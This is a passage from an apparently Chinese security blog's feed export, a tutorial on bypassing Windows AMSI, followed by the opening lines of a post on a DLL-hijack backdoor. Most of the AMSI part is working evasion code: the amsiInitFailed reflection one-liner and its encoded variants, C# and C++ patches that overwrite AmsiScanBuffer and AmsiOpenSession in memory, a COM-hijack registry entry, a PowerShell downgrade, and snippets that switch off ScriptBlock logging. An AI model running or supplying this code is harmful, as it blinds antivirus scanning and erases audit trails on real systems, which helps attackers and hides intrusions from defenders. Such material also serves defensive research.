<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">注：非管理员权限</span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="string">&#x27;HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP&#x27;</span> <span class="literal">-recurse</span> | <span class="built_in">Get-ItemProperty</span> <span class="literal">-name</span> Version <span class="literal">-EA</span> <span class="number">0</span> | <span class="built_in">Where</span> &#123; <span class="variable">$_</span>.PSChildName <span class="operator">-match</span> <span class="string">&#x27;^(?!S)\p&#123;L&#125;&#x27;</span>&#125; | <span class="built_in">Select</span> <span class="literal">-ExpandProperty</span> Version</span><br><span class="line"></span><br><span class="line">注：需要管理员权限</span><br><span class="line">Win10：</span><br><span class="line"><span class="built_in">Get-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> MicrosoftWindowsPowerShellV2</span><br><span class="line"></span><br><span class="line">Win2016/Win2019</span><br><span class="line"><span class="built_in">Get-WindowsFeature</span> PowerShell<span class="literal">-V2</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虚拟机上测试未安装低版本powershell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -version 2   //改变powershell运行版本</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/23/AMSI/image-20220103154159362.png" alt="image-20220103154159362"></p>
<p>这里因为没有环境，我本机装有其他杀软，amsi不起作用，就不演示了</p>
<p>如果在脚本中使用，在脚本开头加入 <code>#requires -version 2</code>，这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版本执行。当然并不是所有脚本都可以在低版本的powershell执行。 </p>
<p>还有一点，用powershell3 /4/5都还是默认以当前版本的powershell来执行</p>
<p><img src="/2022/01/23/AMSI/image-20220103160024995.png" alt="image-20220103160024995"></p>
<p>另外vbscript/jscript不存在所谓降级攻击，因为在10/16/19并不存在像powershell一样的断代<br>情况</p>
<h3 id="2-拆分"><a href="#2-拆分" class="headerlink" title="2.拆分"></a>2.拆分</h3><p><img src="/2022/01/23/AMSI/image-20220103145806943.png" alt="image-20220103145806943"></p>
<h3 id="3-改注册表禁用AMSI"><a href="#3-改注册表禁用AMSI" class="headerlink" title="3.改注册表禁用AMSI"></a>3.改注册表禁用AMSI</h3><p>设置注册表<code>HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable</code>设置为 0，以禁用<br>AMSI。</p>
<p>很奇怪，我在本机和虚拟机上都没有找到这一键值，估计是和系统型号有关</p>
<p><img src="/2022/01/23/AMSI/image-20220103162358415.png" alt="image-20220103162358415"></p>
<p>查阅多方资料，这个方法现在已经不能用了。</p>
<h3 id="4-一键关闭AMSI"><a href="#4-一键关闭AMSI" class="headerlink" title="4.一键关闭AMSI"></a>4.一键关闭AMSI</h3><p>使用一行命令关闭amsi，但是现在被加黑了</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/2022/01/23/AMSI/image-20220102235440814.png" alt="image-20220102235440814"></p>
<p>我们 可以一个个试  到底是哪里被杀了</p>
<p><img src="/2022/01/23/AMSI/image-20220103165241214.png" alt="image-20220103165241214"></p>
<p>单独检测下，可以看到 <code>AmsiUtils</code>和<code>AmsiInitFailed</code>被杀了</p>
<p><img src="/2022/01/23/AMSI/image-20220103165703332.png" alt="image-20220103165703332"></p>
<p><img src="/2022/01/23/AMSI/image-20220103165808764.png" alt="image-20220103165808764"></p>
<p>那接下来的思路就很明确了，就是针对<code>AmsiUtils</code>和<code>AmsiInitFailed</code>这两个字符串进行处理了</p>
<p>其实和混淆shellcode的方法差不多，先编码再解码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;5492868772801748688168747280728187173688878280688776828&quot;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;1173680867656877679866880867644817687416876797271&quot;</span></span><br><span class="line"></span><br><span class="line">//对System.Management.Automation.AmsiUtils进行解码</span><br><span class="line"><span class="variable">$c</span>=[<span class="built_in">string</span>](<span class="number">0</span>..<span class="number">37</span>|%&#123;[<span class="built_in">char</span>][<span class="built_in">int</span>](<span class="number">29</span>+(<span class="variable">$a</span>+<span class="variable">$b</span>).substring((<span class="variable">$_</span>*<span class="number">2</span>),<span class="number">2</span>))&#125;)<span class="operator">-replace</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="variable">$d</span>=[<span class="type">Ref</span>].Assembly.GetType(<span class="variable">$c</span>)</span><br><span class="line"></span><br><span class="line">//对amsiInitFailed进行解码</span><br><span class="line"><span class="variable">$e</span>=[<span class="built_in">string</span>](<span class="number">38</span>..<span class="number">51</span>|%&#123;[<span class="built_in">char</span>][<span class="built_in">int</span>](<span class="number">29</span>+(<span class="variable">$a</span>+<span class="variable">$b</span>).substring((<span class="variable">$_</span>*<span class="number">2</span>),<span class="number">2</span>))&#125;)<span class="operator">-replace</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$d</span>.GetField(<span class="variable">$e</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//组合起来执行</span><br><span class="line"><span class="variable">$f</span>.SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/23/AMSI/image-20220103170440557.png" alt="image-20220103170440557"></p>
<p>其中混淆的关键点就是 编码解码 <code>[string](0..37|%&#123;[char][int](29+($a+$b).substring(($_*2),2))&#125;)-replace &quot; &quot;</code></p>
<p>hex编码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>(<span class="string">&quot;41 6D 73 69 55 74 69 6C 73&quot;</span>.Split(<span class="string">&quot; &quot;</span>)|<span class="keyword">forEach</span>&#123;[<span class="built_in">char</span>]([<span class="type">convert</span>]::toint16(<span class="variable">$_</span>,<span class="number">16</span>))&#125;|<span class="keyword">forEach</span>&#123;<span class="variable">$result</span>=<span class="variable">$result</span>+<span class="variable">$_</span>&#125;;<span class="variable">$result</span>)).GetField(<span class="variable">$</span>(<span class="string">&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;</span>.Split(<span class="string">&quot; &quot;</span>)|<span class="keyword">forEach</span>&#123;[<span class="built_in">char</span>]([<span class="type">convert</span>]::toint16(<span class="variable">$_</span>,<span class="number">16</span>))&#125;|<span class="keyword">forEach</span>&#123;<span class="variable">$result2</span>=<span class="variable">$result2</span>+<span class="variable">$_</span>&#125;;<span class="variable">$result2</span>),<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p>下面的这种 base64亲测失效，虽然可以关掉amsi，但被defender查杀，会立刻结束掉当前powershell进程</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>([<span class="type">Text.Encoding</span>]::Unicode.GetString([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>)))).GetField(<span class="variable">$</span>([<span class="type">Text.Encoding</span>]::Unicode.GetString([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p>更多的混淆办法去学习下powershell，了解语言本身才能产生更多骚思路</p>
<h3 id="5-内存补丁"><a href="#5-内存补丁" class="headerlink" title="5.内存补丁"></a>5.内存补丁</h3><p>AMSI检测相关api的调用顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AmsiInitialize – 初始化AMSI API.</span><br><span class="line">AmsiOpenSession – 打开session</span><br><span class="line">AmsiScanBuffer – scans the user-input.</span><br><span class="line">AmsiCloseSession – 关闭session</span><br><span class="line">AmsiUninitialize – 删除AMSI API</span><br></pre></td></tr></table></figure>

<p>因为amsi是基于字符串静态扫描的，用到的函数是 <code>AmsiScanBuffer</code>，我们是不是可以hook该函数，使其返回我们需要的值呢？理则是修改AmsiScanBuffer函数的参数值（两个思路，一个是修改扫描长度，另一个是修改返回值）</p>
<p>看下<code>AmsiScanBuffer</code>的函数参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">AmsiScanBuffer</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID buffer,</span></span></span><br><span class="line"><span class="params"><span class="function"> ULONG length,</span></span></span><br><span class="line"><span class="params"><span class="function"> LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function"> HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="params"><span class="function"> AMSI_RESULT *result )</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为了让amsi.dll 返回 <code>AMSI_RESULT_NOT_DETECTED</code>，这里的关注点是 <code>hResult</code>，即amsi.dll的返回值，只要它小于0，就可以bypass amsi。通过分析我们可以在<code>AmsiInitialize、AmsiOpenSession、AmsiScanBuffer</code>这3个函数中patch(补丁)都可以达到bypass amsi的效果.</p>
<p>分析后，<code>AmsiInitializ</code>不可以利用，<code>AmsiOpenSession、AmsiScanBuffer</code>可以利用</p>
<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$p=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;</span>isma<span class="string">&quot;;</span></span><br><span class="line"><span class="string">String b =</span></span><br><span class="line"><span class="string">&quot;</span>reffuBnacSismA<span class="string">&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">.dll<span class="string">&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib, String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">,</span></span><br><span class="line"><span class="string">b.Reverse().ToArray()));</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0x57;</span></span><br><span class="line"><span class="string">p[2] = 0x00;</span></span><br><span class="line"><span class="string">p[3] = 0x07;</span></span><br><span class="line"><span class="string">p[4] = 0x80;</span></span><br><span class="line"><span class="string">p[5] = 0xc3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>@</span><br><span class="line">Add-Type $p</span><br><span class="line">[<span class="meta">Program</span>]::Bypass()</span><br></pre></td></tr></table></figure>

<p>这段代码的功能就是在<code>AmsiScanBuffer</code>的函数地址处直接打补丁，补丁汇编是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,0x80070057</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p><code>0x80070057</code>也就是<code>-2147024809</code>，是一个负数，当然也可以是其他负数，而<code>AmsiScanBuffer</code>也可以修<br>改成<code>AmsiOpenSession</code>。怎么把汇编代码转换成代码中的数组呢？使用<a href="https://defuse.ca/online-x86-assembler.htm#disassembly%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%88%E5%BF%AB%E8%BD%AC%E6%8D%A2%E3%80%82%E6%88%91%E4%BB%AC%E6%9D%A5%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%E4%B8%8B%EF%BC%9A">https://defuse.ca/online-x86-assembler.htm#disassembly，可以很快转换。我们来修改代码测试下：</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$p</span>=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;isma&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">.dll&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib,</span></span><br><span class="line"><span class="string">&quot;AmsiOpenSession&quot;);</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0xFF;</span></span><br><span class="line"><span class="string">p[2] = 0xFF;</span></span><br><span class="line"><span class="string">p[3] = 0xFF;</span></span><br><span class="line"><span class="string">p[4] = 0xFF;</span></span><br><span class="line"><span class="string">p[5] = 0xC3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$p</span></span><br><span class="line">[<span class="type">Program</span>]::Bypass()</span><br></pre></td></tr></table></figure>



<p>我们修改了被打补丁的函数为AmsiOpenSession,补丁汇编代码为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,-1</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>我们知道了补丁函数可以为AmsiOpenSession、AmsiScanBuffer，补丁代码可以变化很<br>多，只要返回结果为负数就行。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -NoExit dir&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">    HMODULE hAmsi = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;amsi.dll&quot;</span>);</span><br><span class="line">    LPVOID pAmsiScanBuffer = <span class="built_in">GetProcAddress</span>(hAmsi, <span class="string">&quot;AmsiScanBuffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="keyword">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pAmsiScanBuffer, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (LPVOID)pAmsiScanBuffer, &amp;patch, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pAmsiScanBuffer, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hAmsi);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0xc3的硬编码对应的汇编是ret，也就是调用AmsiScanBuffer直接让他返回。这个马是直接被杀的。</p>
<h2 id="非主流对抗"><a href="#非主流对抗" class="headerlink" title="非主流对抗"></a>非主流对抗</h2><h3 id="1-劫持amsi-dll"><a href="#1-劫持amsi-dll" class="headerlink" title="1.劫持amsi.dll"></a>1.劫持amsi.dll</h3><p>其实就是白加黑，以前做过一次分享，讲的很菜，视频也没有公开。具体原理不再多说，网上有很多。</p>
<p>正常amsi.dll存在于<code>c:\windows\system32\amsi.dll</code>，使用 Aheadlib工具生成或者自己找到 amsi.dll 对应的导出函数，自己写，一样的。当然自己的dll没有签名，这里还涉及到免杀的问题，如果可以添加微软前面，再劫持，又有很大的可玩性。</p>
<h3 id="2-NULL字符绕过"><a href="#2-NULL字符绕过" class="headerlink" title="2.NULL字符绕过"></a>2.NULL字符绕过</h3><p>这个方法已经失效了，但还是提一下，扩充下思路。</p>
<p>Amsi扫描使用的是 <code>AmsiScanString</code>函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HRESULT WINAPI <span class="title">AmsiScanString</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_LPCWSTR string, <span class="comment">// Will be terminated at the first null</span></span></span></span><br><span class="line"><span class="params"><span class="function">character</span></span></span><br><span class="line"><span class="params"><span class="function">_In_LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_HAMSISESSION session,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_AMSI_RESULT *result</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中string就是脚本内容，在执行脚本之前加个空字符就可以截断，而修复的方法是用了 <code>AmsiScanBuffer</code>这个函数，所以amsi才会用这两个函数来扫描</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HRESULT WINAPI <span class="title">AmsiScanBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_	HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_	PVOID buffer, <span class="comment">// Not terminated at the null character</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ 	ULONG length,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_	LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ 	opt_HAMSISESSION session,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_ 	AMSI_RESULT *result</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="3-COM-server劫持"><a href="#3-COM-server劫持" class="headerlink" title="3.COM server劫持"></a>3.COM server劫持</h3><p>原理：amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先<br>从注册表HKCU中找对应的dll去解析，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了。简单来说利用的是注册表优先级来绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;fdb00e52-a214-4aa1-8fba-</span><br><span class="line">4357bb0072ec&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;fdb00e52-a214-4aa1-8fba-4357bb0072ec&#125;\InProcServer32]</span><br><span class="line">@=&quot;C:\\goawayamsi.dll&quot;</span><br></pre></td></tr></table></figure>



<p>而微软通过直接调用amsi.dll 的 <code>DllGetClassObject()</code> 函数替换 <code>CoCreateInstance()</code>，<br>可以避免注册表解析。</p>
<p>但是这种方法也失效了，不过可以学习下思路。</p>
<h2 id="Powershell-版本特性"><a href="#Powershell-版本特性" class="headerlink" title="Powershell 版本特性"></a>Powershell 版本特性</h2><h3 id="PowerShell-V2"><a href="#PowerShell-V2" class="headerlink" title="PowerShell V2"></a>PowerShell V2</h3><p>PowerShell V2提供事件记录能力，可以协助蓝队进行相关的攻击事件推断和关联性分析，但是其日志记录单一，相关Post-Exploitation可做到无痕迹；并且因为系统兼容性，在后续版本攻击者都会尝试降级至此版本去躲避日志记录。</p>
<h3 id="PowerShell-V3-V4"><a href="#PowerShell-V3-V4" class="headerlink" title="PowerShell V3/V4"></a>PowerShell V3/V4</h3><p>PowerShell V3/V4 相比之前提供了更全面的日志记录功能。Windows PowerShell 3.0 改进了对命令和模块的日志记录和跟踪支持。 自PowerShell v3版本以后支持启用PowerShell模块日志记录功能，并将此类日志归属到了4103事件。PowerShell模块日志可以配置为记录所有的PowerShell模块的活动情况，包括单一的PowerShell命令、导入的模块、远程管理等。可以通过GPO进行启用模块日志记录。</p>
<h3 id="PowerShell-V5"><a href="#PowerShell-V5" class="headerlink" title="PowerShell V5"></a>PowerShell V5</h3><p>PowerShell V5加入了CLM和ScriptBlock日志记录功能，能去混淆PowerShell代码并记录到事件日志。随着PowerShell攻击技术的不断成熟，攻击者为了规避防护和日志记录进行了大量的代码混淆，在执行代码之前很难发现或确认这些代码实际上会做些什么事情，给攻击检测和取证造成了一定的困难，因此微软从PowerShell5.0开始加入了日志转储、ScriptBlock日志记录功能，并将其归入到事件4104当中，ScriptBlock Logging提供了在事件日志中记录反混淆的 PowerShell 代码的能力。</p>
<h3 id="PowerShell-V6"><a href="#PowerShell-V6" class="headerlink" title="PowerShell V6"></a>PowerShell V6</h3><p>PowerShell V6 出于功能需求，提供了更全面的系统覆盖能力。由于PowerShell在Linux和MacOS等操作系统上的支持在MacOS上安装（pwsh），处于安全性考虑日志记录作为必不可少的一部分，PowerShell使用本机os_log API登录Apple的统一日志记录系统。在Linux上，PowerShell使用Syslog，微软将此上升成为一种几乎全平台支持的日志记录解决方案。</p>
<h3 id="PowerShell-V7"><a href="#PowerShell-V7" class="headerlink" title="PowerShell V7"></a>PowerShell V7</h3><p>PowerShell V7（PS7）基于.NET Core 3.0，Microsoft旨在提供与Windows PowerShell模块更高的兼容性，高达90％。作为PowerShell 7的一部分，Microsoft在之前的日志记录基础上，增加了一种安全使用本地或远程存储中的凭据的方法，以便不需要将密码嵌入到脚本中。还将改进日志记录，以提供将本地计算机日志发送到远程设备的机制，而不管原始操作系统如何。</p>
<p>这里要说的是V5的脚本日志记录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 按Win+R打开Windows运行窗口,在输入框里输入gepdit.msc,打开Windows本地组策略编辑器;</span><br><span class="line">2. 找到计算机配置/管理模板/Windows组件/Windows Powershell，根据需求打开右侧所需要的日志功能;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/01/23/AMSI/image-20220105004129848.png" alt="image-20220105004129848"></p>
<p>我们可以通过操作注册表的方式，将日志功能关闭。（Empire框架目前已经将该功能整合到payload中）利用如下代码即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$settings</span> = [<span class="type">Ref</span>].Assembly.GetType(<span class="string">&quot;System.Management.Automation.Utils&quot;</span>).GetField(<span class="string">&quot;cachedGroupPolicySettings&quot;</span>,<span class="string">&quot;NonPublic,Static&quot;</span>).GetValue(<span class="variable">$null</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$settings</span>[<span class="string">&quot;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot;</span>] = <span class="selector-tag">@</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$settings</span>[<span class="string">&quot;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot;</span>].Add(<span class="string">&quot;EnableScriptBlockLogging&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="PowerShell-记录可疑字符串"><a href="#PowerShell-记录可疑字符串" class="headerlink" title="PowerShell 记录可疑字符串"></a>PowerShell 记录可疑字符串</h3><p>Powershell v5版本之后，可记录可疑的字符串，如’Add-Type’、’CreateType’等。可通过如下代码降低策略强度</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&quot;System.Management.Automation.ScriptBlock&quot;</span>).GetField(<span class="string">&quot;signatures&quot;</span>,<span class="string">&quot;NonPublic,static&quot;</span>).SetValue(<span class="variable">$null</span>, (<span class="built_in">New-Object</span> <span class="string">&#x27;System.Collections.Generic.HashSet[string]&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AMSI被开发出的时间不长，所以对抗程度也没有很激烈，稍微混淆一下就可以绕过。其实很多杀软也是，绕过的原理都是相同的，万变不离其宗。不过还是要会写代码，对powershell这门语言熟悉才可以更好的混淆</p>
<p>附上一个平台：<a href="https://amsi.fail/">AMSI.fail</a>  可以玩一玩</p>
<p>参考文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">《Bypass AMSI的前世今生》by L.N.</span><br></pre></td></tr></table></figure>

<p>Peace.</p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>AMSI</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>DLL劫持转发重定向后门的分析</title>
    <url>/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>本文首发于奇安信攻防社区，原文链接：<a href="https://forum.butian.net/share/857">https://forum.butian.net/share/857</a></p>
<span id="more"></span>



<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这次分析的是一个exe +dll文件，很明显，在exe执行的时候应该要动态链接该dll的，那就一个个分析，逐一攻破。</p>
